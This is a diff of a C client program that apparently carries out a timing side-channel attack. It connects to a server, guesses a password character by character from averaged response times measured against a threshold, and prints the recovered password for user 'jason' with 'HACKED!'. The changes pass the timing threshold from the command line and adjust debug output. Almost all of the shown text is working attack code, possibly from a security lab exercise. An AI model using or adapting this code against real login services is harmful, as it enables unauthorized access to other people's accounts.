@@ -76,7 +76,7 @@ double test_creds(char* user, char* pass, int username_size, int password_size, 
 
 }
 
-char *perform_attack (int socket, char* username) {
+char *perform_attack (int socket, char* username, int TIME_DIFFERENCE) {
     char *guess = malloc(BUF_SIZE);
     guess[0] = '\0'; //empty string not checked
     double test;
@@ -95,7 +95,7 @@ char *perform_attack (int socket, char* username) {
                 if (test == -1) exit(EXIT_FAILURE);
                 else if (test == -2) {
                     strncat(guess, &CHARS[i], 1);
-                    printf("Found password - exiting perform_attack().\n");
+                    //printf("Found password: %s\n", guess);
                     return guess;
                 }
                 
@@ -104,60 +104,55 @@ char *perform_attack (int socket, char* username) {
 
             test = accum / NUM_ITERS;
 
-            printf("average for char %c is %lf\n", CHARS[i], test);
-
             if (test - exec_time > TIME_DIFFERENCE) {
-                printf("test - exec_time is greater than TIME_DIFFERENCE\n");
                 exec_time = test;
                 strcpy(guess, current_guess);
+                printf("current guess is %s\n", guess);
                 break;
             }
         }
 
-        printf("current guess is %s\n", guess);
+        //printf("current guess is %s\n", guess);
 
-    //perror("password not recovered");
-    //exit(EXIT_FAILURE); //?
     }
   
 }
 
 int main(int argc, char const *argv[]) {
-  if (argc != num_expected_args) {
-    printf("Usage: ./client_test <TIME_DIFFERENCE (us)>");
-    exit(EXIT_FAILURE);
-  }
+    if (argc != num_expected_args) {
+        printf("Usage: ./client_test <TIME_DIFFERENCE (us)>\n");
+        exit(EXIT_FAILURE);
+    }
 
-    int TIME_DIFFERENCE = argv[1];
-  int sock = 0;
-  struct sockaddr_in serv_addr;
+    int TIME_DIFFERENCE = atoi(argv[1]);
+    int sock = 0;
+    struct sockaddr_in serv_addr;
 
-  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-    perror("Error creating socket");
-    exit(EXIT_FAILURE);
-  }
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("Error creating socket");
+        exit(EXIT_FAILURE);
+    }
 
-  serv_addr.sin_family = AF_INET;
-  serv_addr.sin_port = htons(PORT);
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(PORT);
 
-  if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
-	  perror("Error in init_pton");
-	  exit(EXIT_FAILURE);
-  }
+    if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
+	    perror("Error in init_pton");
+	    exit(EXIT_FAILURE);
+    }
 
-  if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
-    perror("Failed to connect");
-	  exit(EXIT_FAILURE);
-  }
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        perror("Failed to connect");
+	    exit(EXIT_FAILURE);
+    }
 
-  printf("connected\n");
+    printf("connected\n");
 
-
-  char *password = perform_attack(sock, "jason");
-  printf("Password for jason is %s. HACKED!\n", password);
+    char *password = perform_attack(sock, "jason", TIME_DIFFERENCE);
+    printf("Password for jason is %s. HACKED!\n", password);
 
     free(password);
 
-  close(sock);
-  return 0;
+    close(sock);
+    return 0;
 }
